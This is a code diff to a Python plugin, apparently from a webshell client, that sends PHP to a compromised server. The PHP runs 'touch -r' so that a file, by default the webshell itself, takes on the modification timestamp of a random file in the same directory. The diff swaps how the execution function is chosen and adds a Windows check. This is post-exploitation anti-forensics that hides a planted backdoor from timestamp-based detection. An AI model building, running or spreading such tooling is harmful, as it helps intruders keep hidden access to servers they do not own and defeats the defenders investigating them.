@@ -1,6 +1,5 @@
-from libs.config import gget, alias, color
-from libs.myapp import send
-from random import choice
+from libs.config import alias, color
+from libs.myapp import send, get_system_code, is_windows
 
 
 def get_php(filename, command):
@@ -8,7 +7,7 @@ def get_php(filename, command):
 $reference = $arr[mt_rand(0, count($arr) - 1)];
 $file='%s';
 if ($file==''){$file=basename($_SERVER['SCRIPT_NAME']);}
-%s("touch -r $reference $file");
+%s
 echo $file.' as '.$reference;""" % (filename, command)
 
 
@@ -17,15 +16,16 @@ def run(filename: str = ""):
     """
     touch
 
-    Specify a file whose modification time stamp is the same as a random file in the current directory.
+    (Only for *unix) Specify a file whose modification time stamp is the same as a random file in the current directory.
 
     eg: touch {filename=this_webshell}
     """
-    disable_function_list = gget("webshell.disable_functions", "webshell")
-    command_execute_set = {"system", "exec", "passthru", "shell_exec"}
+    if (is_windows()):
+        print(color.red("Target system is windows."))
+        return
     try:
-        command = choice(tuple(command_execute_set - set(disable_function_list)))
-        reference = send(get_php(filename, command)).r_text
+        command = get_system_code("touch -r $reference $file")
+        reference = send(get_php(filename, command)).r_text.strip()
         print(color.green(f"Modify time stamp {reference} success."))
     except IndexError:
         print(color.red("all the system execute commands are disabled."))
